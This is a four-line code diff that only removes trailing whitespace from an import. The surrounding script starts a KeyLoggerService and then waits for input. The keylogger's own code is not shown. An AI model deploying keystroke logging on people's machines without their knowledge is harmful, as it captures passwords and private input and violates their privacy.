@@ -1,4 +1,4 @@
-from KeyLoggerService import KeyLoggerService  
+from KeyLoggerService import KeyLoggerService
 keyloger = KeyLoggerService()
 keyloger.start_logging()
 a = input()
